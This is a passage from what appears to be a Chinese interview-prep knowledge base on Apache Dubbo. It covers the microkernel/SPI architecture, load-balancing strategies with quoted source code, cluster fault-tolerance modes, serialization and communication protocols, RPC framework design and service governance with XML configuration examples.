的微内核架构了解吗？    Dubbo 采用 微内核（Microkernel） + 插件（Plugin） 模式，简单来说就是微内核架构。微内核只负责组装插件。\n何为微内核架构呢？ 《软件架构模式》 这本书是这样介绍的：\n 微内核架构模式（有时被称为插件架构模式）是实现基于产品应用程序的一种自然模式。基于产品的应用程序是已经打包好并且拥有不同版本，可作为第三方插件下载的。然后，很多公司也在开发、发布自己内部商业应用像有版本号、说明及可加载插件式的应用软件（这也是这种模式的特征）。微内核系统可让用户添加额外的应用如插件，到核心应用，继而提供了可扩展性和功能分离的用法。\n 微内核架构包含两类组件：核心系统（core system） 和 插件模块（plug-in modules）。\n核心系统提供系统所需核心能力，插件模块可以扩展系统的功能。因此， 基于微内核架构的系统，非常易于扩展功能。\n我们常见的一些IDE，都可以看作是基于微内核架构设计的。绝大多数 IDE比如IDEA、VSCode都提供了插件来丰富自己的功能。\n正是因为Dubbo基于微内核架构，才使得我们可以随心所欲替换Dubbo的功能点。比如你觉得Dubbo 的序列化模块实现的不满足自己要求，没关系啊！你自己实现一个序列化模块就好了啊！\n通常情况下，微核心都会采用 Factory、IoC、OSGi 等方式管理插件生命周期。Dubbo 不想依赖 Spring 等 IoC 容器，也不想自己造一个小的 IoC 容器（过度设计），因此采用了一种最简单的 Factory 方式管理插件 ：JDK 标准的 SPI 扩展机制 （java.util.ServiceLoader）。\n关于Dubbo架构的一些自测小问题    注册中心的作用了解么？    注册中心负责服务地址的注册与查找，相当于目录服务，服务提供者和消费者只在启动时与注册中心交互。\n服务提供者宕机后，注册中心会做什么？    注册中心会立即推送事件通知消费者。\n监控中心的作用呢？    监控中心负责统计各服务调用次数，调用时间等。\n注册中心和监控中心都宕机的话，服务都会挂掉吗？    不会。两者都宕机也不影响已运行的提供者和消费者，消费者在本地缓存了提供者列表。注册中心和监控中心都是可选的，服务消费者可以直连服务提供者。\nDubbo 的负载均衡策略    什么是负载均衡？    先来看一下稍微官方点的解释。下面这段话摘自维基百科对负载均衡的定义：\n 负载均衡改善了跨多个计算资源（例如计算机，计算机集群，网络链接，中央处理单元或磁盘驱动）的工作负载分布。负载平衡旨在优化资源使用，最大化吞吐量，最小化响应时间，并避免任何单个资源的过载。使用具有负载平衡而不是单个组件的多个组件可以通过冗余提高可靠性和可用性。负载平衡通常涉及专用软件或硬件。\n 上面讲的大家可能不太好理解，再用通俗的话给大家说一下。\n我们的系统中的某个服务的访问量特别大，我们将这个服务部署在了多台服务器上，当客户端发起请求的时候，多台服务器都可以处理这个请求。那么，如何正确选择处理该请求的服务器就很关键。假如，你就要一台服务器来处理该服务的请求，那该服务部署在多台服务器的意义就不复存在了。负载均衡就是为了避免单个服务器响应同一请求，容易造成服务器宕机、崩溃等问题，我们从负载均衡的这四个字就能明显感受到它的意义。\nDubbo 提供的负载均衡策略有哪些？    在集群负载均衡时，Dubbo 提供了多种均衡策略，默认为 random 随机调用。我们还可以自行扩展负载均衡策略（参考Dubbo SPI机制）。\n在 Dubbo 中，所有负载均衡实现类均继承自 AbstractLoadBalance，该类实现了 LoadBalance 接口，并封装了一些公共的逻辑。\npublic abstract class AbstractLoadBalance implements LoadBalance { static int calculateWarmupWeight(int uptime, int warmup, int weight) { } @Override public \u0026lt;T\u0026gt; Invoker\u0026lt;T\u0026gt; select(List\u0026lt;Invoker\u0026lt;T\u0026gt;\u0026gt; invokers, URL url, Invocation invocation) { } protected abstract \u0026lt;T\u0026gt; Invoker\u0026lt;T\u0026gt; doSelect(List\u0026lt;Invoker\u0026lt;T\u0026gt;\u0026gt; invokers, URL url, Invocation invocation); int getWeight(Invoker\u0026lt;?\u0026gt; invoker, Invocation invocation) { } } AbstractLoadBalance 的实现类有下面这些：\n官方文档对负载均衡这部分的介绍非常详细，推荐小伙伴们看看，地址：https://dubbo.apache.org/zh/docs/v2.7/dev/source/loadbalance/#m-zhdocsv27devsourceloadbalance 。\nRandomLoadBalance    根据权重随机选择（对加权随机算法的实现）。这是Dubbo默认采用的一种负载均衡策略。\n RandomLoadBalance 具体的实现原理非常简单，假如有两个提供相同服务的服务器 S1,S2，S1的权重为7，S2的权重为3。\n我们把这些权重值分布在坐标区间会得到：S1-\u0026gt;[0, 7) ，S2-\u0026gt;[7, 10)。我们生成[0, 10) 之间的随机数，随机数落到对应的区间，我们就选择对应的服务器来处理请求。\nRandomLoadBalance 的源码非常简单，简单花几分钟时间看一下。\n 以下源码来自 Dubbo master 分支上的最新的版本 2.7.9。\n public class RandomLoadBalance extends AbstractLoadBalance { public static final String NAME = \u0026#34;random\u0026#34;; @Override protected \u0026lt;T\u0026gt; Invoker\u0026lt;T\u0026gt; doSelect(List\u0026lt;Invoker\u0026lt;T\u0026gt;\u0026gt; invokers, URL url, Invocation invocation) { int length = invokers.size(); boolean sameWeight = true; int[] weights = new int[length]; int totalWeight = 0; // 下面这个for循环的主要作用就是计算所有该服务的提供者的权重之和 totalWeight（），  // 除此之外，还会检测每个服务提供者的权重是否相同  for (int i = 0; i \u0026lt; length; i++) { int weight = getWeight(invokers.get(i), invocation); totalWeight += weight; weights[i] = totalWeight; if (sameWeight \u0026amp;\u0026amp; totalWeight != weight * (i + 1)) { sameWeight = false; } } if (totalWeight \u0026gt; 0 \u0026amp;\u0026amp; !sameWeight) { // 随机生成一个 [0, totalWeight) 区间内的数字  int offset = ThreadLocalRandom.current().nextInt(totalWeight); // 判断会落在哪个服务提供者的区间  for (int i = 0; i \u0026lt; length; i++) { if (offset \u0026lt; weights[i]) { return invokers.get(i); } } return invokers.get(ThreadLocalRandom.current().nextInt(length)); } } LeastActiveLoadBalance    LeastActiveLoadBalance 直译过来就是最小活跃数负载均衡。\n这个名字起得有点不直观，不仔细看官方对活跃数的定义，你压根不知道这玩意是干嘛的。\n我这么说吧！初始状态下所有服务提供者的活跃数均为 0（每个服务提供者的中特定方法都对应一个活跃数，我在后面的源码中会提到），每收到一个请求后，对应的服务提供者的活跃数 +1，当这个请求处理完之后，活跃数 -1。\n因此，Dubbo 就认为谁的活跃数越少，谁的处理速度就越快，性能也越好，这样的话，我就优先把请求给活跃数少的服务提供者处理。\n如果有多个服务提供者的活跃数相等怎么办？\n很简单，那就再走一遍 RandomLoadBalance 。\npublic class LeastActiveLoadBalance extends AbstractLoadBalance { public static final String NAME = \u0026#34;leastactive\u0026#34;; @Override protected \u0026lt;T\u0026gt; Invoker\u0026lt;T\u0026gt; doSelect(List\u0026lt;Invoker\u0026lt;T\u0026gt;\u0026gt; invokers, URL url, Invocation invocation) { int length = invokers.size(); int leastActive = -1; int leastCount = 0; int[] leastIndexes = new int[length]; int[] weights = new int[length]; int totalWeight = 0; int firstWeight = 0; boolean sameWeight = true; // 这个 for 循环的主要作用是遍历 invokers 列表，找出活跃数最小的 Invoker  // 如果有多个 Invoker 具有相同的最小活跃数，还会记录下这些 Invoker 在 invokers 集合中的下标，并累加它们的权重，比较它们的权重值是否相等  for (int i = 0; i \u0026lt; length; i++) { Invoker\u0026lt;T\u0026gt; invoker = invokers.get(i); // 获取 invoker 对应的活跃(active)数  int active = RpcStatus.getStatus(invoker.getUrl(), invocation.getMethodName()).getActive(); int afterWarmup = getWeight(invoker, invocation); weights[i] = afterWarmup; if (leastActive == -1 || active \u0026lt; leastActive) { leastActive = active; leastCount = 1; leastIndexes[0] = i; totalWeight = afterWarmup; firstWeight = afterWarmup; sameWeight = true; } else if (active == leastActive) { leastIndexes[leastCount++] = i; totalWeight += afterWarmup; if (sameWeight \u0026amp;\u0026amp; afterWarmup != firstWeight) { sameWeight = false; } } } // 如果只有一个 Invoker 具有最小的活跃数，此时直接返回该 Invoker 即可  if (leastCount == 1) { return invokers.get(leastIndexes[0]); } // 如果有多个 Invoker 具有相同的最小活跃数，但它们之间的权重不同  // 这里的处理方式就和 RandomLoadBalance 一致了  if (!sameWeight \u0026amp;\u0026amp; totalWeight \u0026gt; 0) { int offsetWeight = ThreadLocalRandom.current().nextInt(totalWeight); for (int i = 0; i \u0026lt; leastCount; i++) { int leastIndex = leastIndexes[i]; offsetWeight -= weights[leastIndex]; if (offsetWeight \u0026lt; 0) { return invokers.get(leastIndex); } } } return invokers.get(leastIndexes[ThreadLocalRandom.current().nextInt(leastCount)]); } } 活跃数是通过 RpcStatus 中的一个 ConcurrentMap 保存的，根据 URL 以及服务提供者被调用的方法的名称，我们便可以获取到对应的活跃数。也就是说服务提供者中的每一个方法的活跃数都是互相独立的。\npublic class RpcStatus { private static final ConcurrentMap\u0026lt;String, ConcurrentMap\u0026lt;String, RpcStatus\u0026gt;\u0026gt; METHOD_STATISTICS = new ConcurrentHashMap\u0026lt;String, ConcurrentMap\u0026lt;String, RpcStatus\u0026gt;\u0026gt;(); public static RpcStatus getStatus(URL url, String methodName) { String uri = url.toIdentityString(); ConcurrentMap\u0026lt;String, RpcStatus\u0026gt; map = METHOD_STATISTICS.computeIfAbsent(uri, k -\u0026gt; new ConcurrentHashMap\u0026lt;\u0026gt;()); return map.computeIfAbsent(methodName, k -\u0026gt; new RpcStatus()); } public int getActive() { return active.get(); } } ConsistentHashLoadBalance    ConsistentHashLoadBalance 小伙伴们应该也不会陌生，在分库分表、各种集群中就经常使用这个负载均衡策略。\nConsistentHashLoadBalance 即一致性Hash负载均衡策略。 ConsistentHashLoadBalance 中没有权重的概念，具体是哪个服务提供者处理请求是由你的请求的参数决定的，也就是说相同参数的请求总是发到同一个服务提供者。\n另外，Dubbo 为了避免数据倾斜问题（节点不够分散，大量请求落到同一节点），还引入了虚拟节点的概念。通过虚拟节点可以让节点更加分散，有效均衡各个节点的请求量。\n官方有详细的源码分析：https://dubbo.apache.org/zh/docs/v2.7/dev/source/loadbalance/#23-consistenthashloadbalance 。这里还有一个相关的 PR#5440 来修复老版本中 ConsistentHashLoadBalance 存在的一些Bug。感兴趣的小伙伴，可以多花点时间研究一下。我这里不多分析了，这个作业留给你们！\nRoundRobinLoadBalance    加权轮询负载均衡。\n轮询就是把请求依次分配给每个服务提供者。加权轮询就是在轮询的基础上，让更多的请求落到权重更大的服务提供者上。比如假如有两个提供相同服务的服务器 S1,S2，S1的权重为7，S2的权重为3。\n如果我们有 10 次请求，那么 7 次会被 S1处理，3次被 S2处理。\n但是，如果是 RandomLoadBalance 的话，很可能存在10次请求有9次都被 S1 处理的情况（概率性问题）。\nDubbo 中的 RoundRobinLoadBalance 的代码实现被修改重建了好几次，Dubbo-2.6.5 版本的 RoundRobinLoadBalance 为平滑加权轮询算法。\nDubbo序列化协议    Dubbo 支持哪些序列化方式呢？    Dubbo 支持多种序列化方式：JDK自带的序列化、hessian2、JSON、Kryo、FST、Protostuff，ProtoBuf等等。\nDubbo 默认使用的序列化方式是 hession2。\n谈谈你对这些序列化协议了解？    一般我们不会直接使用 JDK 自带的序列化方式。主要原因有两个：\n 不支持跨语言调用 : 如果调用的是其他语言开发的服务的时候就不支持了。 性能差 ：相比于其他序列化框架性能更低，主要原因是序列化之后的字节数组体积较大，导致传输成本加大。  JSON 序列化由于性能问题，我们一般也不会考虑使用。\n像 Protostuff，ProtoBuf、hessian2这些都是跨语言的序列化方式，如果有跨语言需求的话可以考虑使用。\nKryo和FST这两种序列化方式是 Dubbo 后来才引入的，性能非常好。不过，这两者都是专门针对 Java 语言的。Dubbo 官网的一篇文章中提到说推荐使用 Kryo 作为生产环境的序列化方式。(文章地址：https://dubbo.apache.org/zh/docs/v2.7/user/references/protocol/rest/)\nDubbo 官方文档中还有一个关于这些序列化协议的性能对比图可供参考。\n"},{"id":159,"href":"/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/dubbo-load-balancing/","title":"dubbo-load-balancing","parent":"分布式系统","content":"面试题    dubbo 负载均衡策略和集群容错策略都有哪些？动态代理策略呢？\n面试官心理分析    继续深问吧，这些都是用 dubbo 必须知道的一些东西，你得知道基本原理，知道序列化是什么协议，还得知道具体用 dubbo 的时候，如何负载均衡，如何高可用，如何动态代理。\n说白了，就是看你对 dubbo 熟悉不熟悉：\n dubbo 工作原理：服务注册、注册中心、消费者、代理通信、负载均衡； 网络通信、序列化：dubbo 协议、长连接、NIO、hessian 序列化协议； 负载均衡策略、集群容错策略、动态代理策略：dubbo 跑起来的时候一些功能是如何运转的？怎么做负载均衡？怎么做集群容错？怎么生成动态代理？ dubbo SPI 机制：你了解不了解 dubbo 的 SPI 机制？如何基于 SPI 机制对 dubbo 进行扩展？  面试题剖析    dubbo 负载均衡策略    RandomLoadBalance    默认情况下，dubbo 是 RandomLoadBalance ，即随机调用实现负载均衡，可以对 provider 不同实例设置不同的权重，会按照权重来负载均衡，权重越大分配流量越高，一般就用这个默认的就可以了。\n算法思想很简单。假设有一组服务器 servers = [A, B, C]，他们对应的权重为 weights = [5, 3, 2]，权重总和为 10。现在把这些权重值平铺在一维坐标值上，[0, 5) 区间属于服务器 A，[5, 8) 区间属于服务器 B，[8, 10) 区间属于服务器 C。接下来通过随机数生成器生成一个范围在 [0, 10) 之间的随机数，然后计算这个随机数会落到哪个区间上。比如数字 3 会落到服务器 A 对应的区间上，此时返回服务器 A 即可。权重越大的机器，在坐标轴上对应的区间范围就越大，因此随机数生成器生成的数字就会有更大的概率落到此区间内。只要随机数生成器产生的随机数分布性很好，在经过多次选择后，每个服务器被选中的次数比例接近其权重比例。比如，经过一万次选择后，服务器 A 被选中的次数大约为 5000 次，服务器 B 被选中的次数约为 3000 次，服务器 C 被选中的次数约为 2000 次。\nRoundRobinLoadBalance    这个的话默认就是均匀地将流量打到各个机器上去，但是如果各个机器的性能不一样，容易导致性能差的机器负载过高。所以此时需要调整权重，让性能差的机器承载权重小一些，流量少一些。\n举个栗子。\n跟运维同学申请机器，有的时候，我们运气好，正好公司资源比较充足，刚刚有一批热气腾腾、刚刚做好的虚拟机新鲜出炉，配置都比较高：8 核 + 16G 机器，申请到 2 台。过了一段时间，我们感觉 2 台机器有点不太够，我就去找运维同学说，“哥儿们，你能不能再给我一台机器”，但是这时只剩下一台 4 核 + 8G 的机器。我要还是得要。\n这个时候，可以给两台 8 核 16G 的机器设置权重 4，给剩余 1 台 4 核 8G 的机器设置权重 2。\nLeastActiveLoadBalance    官网对 LeastActiveLoadBalance 的解释是“最小活跃数负载均衡”，活跃调用数越小，表明该服务提供者效率越高，单位时间内可处理更多的请求，那么此时请求会优先分配给该服务提供者。\n最小活跃数负载均衡算法的基本思想是这样的：\n每个服务提供者会对应着一个活跃数 active。初始情况下，所有服务提供者的 active 均为 0。每当收到一个请求，对应的服务提供者的 active 会加 1，处理完请求后，active 会减 1。所以，如果服务提供者性能较好，处理请求的效率就越高，那么 active 也会下降的越快。因此可以给这样的服务提供者优先分配请求。\n当然，除了最小活跃数，LeastActiveLoadBalance 在实现上还引入了权重值。所以准确的来说，LeastActiveLoadBalance 是基于加权最小活跃数算法实现的。\nConsistentHashLoadBalance    一致性 Hash 算法，相同参数的请求一定分发到一个 provider 上去，provider 挂掉的时候，会基于虚拟节点均匀分配剩余的流量，抖动不会太大。如果你需要的不是随机负载均衡，是要一类请求都到一个节点，那就走这个一致性 Hash 策略。\n 关于 dubbo 负载均衡策略更加详细的描述，可以查看官网 http://dubbo.apache.org/zh-cn/docs/source_code_guide/loadbalance.html 。\n dubbo 集群容错策略    Failover Cluster 模式    失败自动切换，自动重试其他机器，默认就是这个，常见于读操作。（失败重试其它机器）\n可以通过以下几种方式配置重试次数：\n\u0026lt;dubbo:service retries=\u0026#34;2\u0026#34; /\u0026gt; 或者\n\u0026lt;dubbo:reference retries=\u0026#34;2\u0026#34; /\u0026gt; 或者\n\u0026lt;dubbo:reference\u0026gt; \u0026lt;dubbo:method name=\u0026#34;findFoo\u0026#34; retries=\u0026#34;2\u0026#34; /\u0026gt; \u0026lt;/dubbo:reference\u0026gt; Failfast Cluster 模式    一次调用失败就立即失败，常见于非幂等性的写操作，比如新增一条记录（调用失败就立即失败）\nFailsafe Cluster 模式    出现异常时忽略掉，常用于不重要的接口调用，比如记录日志。\n配置示例如下：\n\u0026lt;dubbo:service cluster=\u0026#34;failsafe\u0026#34; /\u0026gt; 或者\n\u0026lt;dubbo:reference cluster=\u0026#34;failsafe\u0026#34; /\u0026gt; Failback Cluster 模式    失败了后台自动记录请求，然后定时重发，比较适合于写消息队列这种。\nForking Cluster 模式    并行调用多个 provider，只要一个成功就立即返回。常用于实时性要求比较高的读操作，但是会浪费更多的服务资源，可通过 forks=\u0026quot;2\u0026quot; 来设置最大并行数。\nBroadcast Cluster 模式    逐个调用所有的 provider。任何一个 provider 出错则报错（从 2.1.0 版本开始支持）。通常用于通知所有提供者更新缓存或日志等本地资源信息。\n 关于 dubbo 集群容错策略更加详细的描述，可以查看官网 http://dubbo.apache.org/zh-cn/docs/source_code_guide/cluster.html 。\n dubbo 动态代理策略    默认使用 javassist 动态字节码生成，创建代理类。但是可以通过 spi 扩展机制配置自己的动态代理策略。\n"},{"id":160,"href":"/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/dubbo-operating-principle/","title":"dubbo-operating-principle","parent":"分布式系统","content":"面试题    说一下的 dubbo 的工作原理？注册中心挂了可以继续通信吗？说说一次 rpc 请求的流程？\n面试官心理分析    MQ、ES、Redis、Dubbo，上来先问你一些思考性的问题、原理，比如 kafka 高可用架构原理、es 分布式架构原理、redis 线程模型原理、Dubbo 工作原理；之后就是生产环境里可能会碰到的一些问题，因为每种技术引入之后生产环境都可能会碰到一些问题；再来点综合的，就是系统设计，比如让你设计一个 MQ、设计一个搜索引擎、设计一个缓存、设计一个 rpc 框架等等。\n那既然开始聊分布式系统了，自然重点先聊聊 dubbo 了，毕竟 dubbo 是目前事实上大部分公司的分布式系统的 rpc 框架标准，基于 dubbo 也可以构建一整套的微服务架构。但是需要自己大量开发。\n当然去年开始 spring cloud 非常火，现在大量的公司开始转向 spring cloud 了，spring cloud 人家毕竟是微服务架构的全家桶式的这么一个东西。但是因为很多公司还在用 dubbo，所以 dubbo 肯定会是目前面试的重点，何况人家 dubbo 现在重启开源社区维护了，捐献给了 apache，未来应该也还是有一定市场和地位的。\n既然聊 dubbo，那肯定是先从 dubbo 原理开始聊了，你先说说 dubbo 支撑 rpc 分布式调用的架构啥的，然后说说一次 rpc 请求 dubbo 是怎么给你完成的，对吧。\n面试题剖析    dubbo 工作原理     第一层：service 层，接口层，给服务提供者和消费者来实现的 第二层：config 层，配置层，主要是对 dubbo 进行各种配置的 第三层：proxy 层，服务代理层，无论是 consumer 还是 provider，dubbo 都会给你生成代理，代理之间进行网络通信 第四层：registry 层，服务注册层，负责服务的注册与发现 第五层：cluster 层，集群层，封装多个服务提供者的路由以及负载均衡，将多个实例组合成一个服务 第六层：monitor 层，监控层，对 rpc 接口的调用次数和调用时间进行监控 第七层：protocal 层，远程调用层，封装 rpc 调用 第八层：exchange 层，信息交换层，封装请求响应模式，同步转异步 第九层：transport 层，网络传输层，抽象 mina 和 netty 为统一接口 第十层：serialize 层，数据序列化层  工作流程     第一步：provider 向注册中心去注册 第二步：consumer 从注册中心订阅服务，注册中心会通知 consumer 注册好的服务 第三步：consumer 调用 provider 第四步：consumer 和 provider 都异步通知监控中心  注册中心挂了可以继续通信吗？    可以，因为刚开始初始化的时候，消费者会将提供者的地址等信息拉取到本地缓存，所以注册中心挂了可以继续通信。\n"},{"id":161,"href":"/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/dubbo-rpc-design/","title":"dubbo-rpc-design","parent":"分布式系统","content":"面试题    如何自己设计一个类似 Dubbo 的 RPC 框架？\n面试官心理分析    说实话，就这问题，其实就跟问你如何自己设计一个 MQ 一样的道理，就考两个：\n 你有没有对某个 rpc 框架原理有非常深入的理解。 你能不能从整体上来思考一下，如何设计一个 rpc 框架，考考你的系统设计能力。  面试题剖析    其实问到你这问题，你起码不能认怂，因为是知识的扫盲，那我不可能给你深入讲解什么 kafka 源码剖析，dubbo 源码剖析，何况我就算讲了，你要真的消化理解和吸收，起码个把月以后了。\n所以我给大家一个建议，遇到这类问题，起码从你了解的类似框架的原理入手，自己说说参照 dubbo 的原理，你来设计一下，举个例子，dubbo 不是有那么多分层么？而且每个分层是干啥的，你大概是不是知道？那就按照这个思路大致说一下吧，起码你不能懵逼，要比那些上来就懵，啥也说不出来的人要好一些。\n举个栗子，我给大家说个最简单的回答思路：\n 上来你的服务就得去注册中心注册吧，你是不是得有个注册中心，保留各个服务的信息，可以用 zookeeper 来做，对吧。 然后你的消费者需要去注册中心拿对应的服务信息吧，对吧，而且每个服务可能会存在于多台机器上。 接着你就该发起一次请求了，咋发起？当然是基于动态代理了，你面向接口获取到一个动态代理，这个动态代理就是接口在本地的一个代理，然后这个代理会找到服务对应的机器地址。 然后找哪个机器发送请求？那肯定得有个负载均衡算法了，比如最简单的可以随机轮询是不是。 接着找到一台机器，就可以跟它发送请求了，第一个问题咋发送？你可以说用 netty 了，nio 方式；第二个问题发送啥格式数据？你可以说用 hessian 序列化协议了，或者是别的，对吧。然后请求过去了。 服务器那边一样的，需要针对你自己的服务生成一个动态代理，监听某个网络端口了，然后代理你本地的服务代码。接收到请求的时候，就调用对应的服务代码，对吧。  这就是一个最最基本的 rpc 框架的思路，先不说你有多牛逼的技术功底，哪怕这个最简单的思路你先给出来行不行？\n"},{"id":162,"href":"/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/dubbo-serialization-protocol/","title":"dubbo-serialization-protocol","parent":"分布式系统","content":"面试题    dubbo 支持哪些通信协议？支持哪些序列化协议？说一下 Hessian 的数据结构？PB 知道吗？为什么 PB 的效率是最高的？\n面试官心理分析    上一个问题，说说 dubbo 的基本工作原理，那是你必须知道的，至少要知道 dubbo 分成哪些层，然后平时怎么发起 rpc 请求的，注册、发现、调用，这些是基本的。\n接着就可以针对底层进行深入的问问了，比如第一步就可以先问问序列化协议这块，就是平时 RPC 的时候怎么走的？\n面试题剖析    序列化，就是把数据结构或者是一些对象，转换为二进制串的过程，而反序列化是将在序列化过程中所生成的二进制串转换成数据结构或者对象的过程。\ndubbo 支持不同的通信协议     dubbo 协议 dubbo://  默认就是走 dubbo 协议，单一长连接，进行的是 NIO 异步通信，基于 hessian 作为序列化协议。使用的场景是：传输数据量小（每次请求在 100kb 以内），但是并发量很高，以及服务消费者机器数远大于服务提供者机器数的情况。\n为了要支持高并发场景，一般是服务提供者就几台机器，但是服务消费者有上百台，可能每天调用量达到上亿次！此时用长连接是最合适的，就是跟每个服务消费者维持一个长连接就可以，可能总共就 100 个连接。然后后面直接基于长连接 NIO 异步通信，可以支撑高并发请求。\n长连接，通俗点说，就是建立连接过后可以持续发送请求，无须再建立连接。\n而短连接，每次要发送请求之前，需要先重新建立一次连接。\n rmi 协议 rmi://  RMI 协议采用 JDK 标准的 java.rmi.* 实现，采用阻塞式短连接和 JDK 标准序列化方式。多个短连接，适合消费者和提供者数量差不多的情况，适用于文件的传输，一般较少用。\n hessian 协议 hessian://  Hessian 1 协议用于集成 Hessian 的服务，Hessian 底层采用 Http 通讯，采用 Servlet 暴露服务，Dubbo 缺省内嵌 Jetty 作为服务器实现。走 hessian 序列化协议，多个短连接，适用于提供者数量比消费者数量还多的情况，适用于文件的传输，一般较少用。\n http 协议 http://  基于 HTTP 表单的远程调用协议，采用 Spring 的 HttpInvoker 实现。走表单序列化。\n thrift 协议 thrift://  当前 dubbo 支持的 thrift 协议是对 thrift 原生协议的扩展，在原生协议的基础上添加了一些额外的头信息，比如 service name，magic number 等。\n webservice webservice://  基于 WebService 的远程调用协议，基于 Apache CXF 的 frontend-simple 和 transports-http 实现。走 SOAP 文本序列化。\n memcached 协议 memcached://  基于 memcached 实现的 RPC 协议。\n redis 协议 redis://  基于 Redis 实现的 RPC 协议。\n rest 协议 rest://  基于标准的 Java REST API——JAX-RS 2.0（Java API for RESTful Web Services 的简写）实现的 REST 调用支持。\n gPRC 协议 grpc://  Dubbo 自 2.7.5 版本开始支持 gRPC 协议，对于计划使用 HTTP/2 通信，或者想利用 gRPC 带来的 Stream、反压、Reactive 编程等能力的开发者来说， 都可以考虑启用 gRPC 协议。\ndubbo 支持的序列化协议    dubbo 支持 hession、Java 二进制序列化、json、SOAP 文本序列化多种序列化协议。但是 hessian 是其默认的序列化协议。\n说一下 Hessian 的数据结构    Hessian 的对象序列化机制有 8 种原始类型：\n 原始二进制数据 boolean 64-bit date（64 位毫秒值的日期） 64-bit double 32-bit int 64-bit long null UTF-8 编码的 string  另外还包括 3 种递归类型：\n list for lists and arrays map for maps and dictionaries object for objects  还有一种特殊的类型：\n ref：用来表示对共享对象的引用。  为什么 PB 的效率是最高的？    其实 PB 之所以性能如此好，主要得益于两个：第一，它使用 proto 编译器，自动进行序列化和反序列化，速度非常快，应该比 XML 和 JSON 快上了 20~100 倍；第二，它的数据压缩效果好，就是说它序列化后的数据量体积小。因为体积小，传输起来带宽和速度上会有优化。\n"},{"id":163,"href":"/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/dubbo-service-management/","title":"dubbo-service-management","parent":"分布式系统","content":"面试题    如何基于 dubbo 进行服务治理、服务降级、失败重试以及超时重试？\n面试官心理分析    服务治理，这个问题如果问你，其实就是看看你有没有服务治理的思想，因为这个是做过复杂微服务的人肯定会遇到的一个问题。\n服务降级，这个是涉及到复杂分布式系统中必备的一个话题，因为分布式系统互相来回调用，任何一个系统故障了，你不降级，直接就全盘崩溃？那就太坑爹了吧。\n失败重试，分布式系统中网络请求如此频繁，要是因为网络问题不小心失败了一次，是不是要重试？\n超时重试，跟上面一样，如果不小心网络慢一点，超时了，如何重试？\n面试题剖析    服务治理    1. 调用链路自动生成    一个大型的分布式系统，或者说是用现在流行的微服务架构来说吧，分布式系统由大量的服务组成。那么这些服务之间互相是如何调用的？调用链路是啥？说实话，几乎到后面没人搞的清楚了，因为服务实在太多了，可能几百个甚至几千个服务。\n那就需要基于 dubbo 做的分布式系统中，对各个服务之间的调用自动记录下来，然后自动将各个服务之间的依赖关系和调用链路生成出来，做成一张图，显示出来，大家才可以看到对吧。\n2. 服务访问压力以及时长统计    需要自动统计各个接口和服务之间的调用次数以及访问延时，而且要分成两个级别。\n 一个级别是接口粒度，就是每个服务的每个接口每天被调用多少次，TP50/TP90/TP99，三个档次的请求延时分别是多少； 第二个级别是从源头入口开始，一个完整的请求链路经过几十个服务之后，完成一次请求，每天全链路走多少次，全链路请求延时的 TP50/TP90/TP99，分别是多少。  这些东西都搞定了之后，后面才可以来看当前系统的压力主要在哪里，如何来扩容和优化啊。\n3. 其它     服务分层（避免循环依赖） 调用链路失败监控和报警 服务鉴权 每个服务的可用性的监控（接口调用成功率？几个 9？99.99%，99.9%，99%）  服务降级    比如说服务 A 调用服务 B，结果服务 B 挂掉了，服务 A 重试几次调用服务 B，还是不行，那么直接降级，走一个备用的逻辑，给用户返回响应。\n举个栗子，我们有接口 HelloService 。 HelloServiceImpl 有该接口的具体实现。\npublic interface HelloService { void sayHello(); } public class HelloServiceImpl implements HelloService { public void sayHello() { System.out.println(\u0026#34;hello world......\u0026#34;); } } \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:dubbo=\u0026#34;http://code.alibabatech.com/schema/dubbo\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://code.alibabatech.com/schema/dubbo http://code.alibabatech.com/schema/dubbo/dubbo.xsd\u0026#34;\u0026gt; \u0026lt;dubbo:application name=\u0026#34;dubbo-provider\u0026#34; /\u0026gt; \u0026lt;dubbo:registry address=\u0026#34;zookeeper://127.0.0.1:2181\u0026#34; /\u0026gt; \u0026lt;dubbo:protocol name=\u0026#34;dubbo\u0026#34; port=\u0026#34;20880\u0026#34; /\u0026gt; \u0026lt;dubbo:service interface=\u0026#34;com.zhss.service.HelloService\u0026#34; ref=\u0026#34;helloServiceImpl\u0026#34; timeout=\u0026#34;10000\u0026#34; /\u0026gt; \u0026lt;bean id=\u0026#34;helloServiceImpl\u0026#34; class=\u0026#34;com.zhss.service.HelloServiceImpl\u0026#34; /\u0026gt; \u0026lt;/beans\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:dubbo=\u0026#34;http://code.alibabatech.com/schema/dubbo\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://code.alibabatech.com/schema/dubbo http://code.alibabatech.com/schema/dubbo/dubbo.xsd\u0026#34;\u0026gt; \u0026lt;dubbo:application name=\u0026#34;dubbo-consumer\u0026#34; /\u0026gt; \u0026lt;dubbo:registry address=\u0026#34;zookeeper://127.0.0.1:2181\u0026#34; /\u0026gt; \u0026lt;dubbo:reference id=\u0026#34;fooService\u0026#34; interface=\u0026#34;com.test.service.FooService\u0026#34; timeout=\u0026#34;10000\u0026#34; check=\u0026#34;false\u0026#34; mock=\u0026#34;return null\u0026#34;\u0026gt; \u0026lt;/dubbo:reference\u0026gt; \u0026lt;/beans\u0026gt; 我们调用接口失败的时候，可以通过 mock 统一返回 null。\nmock 的值也可以修改为 true，然后再跟接口同一个路径下实现一个 Mock 类，命名规则是 “接口名称+ Mock ” 后缀。然后在 Mock 类里实现自己的降级逻辑。\npublic class HelloServiceMock implements HelloService { public void 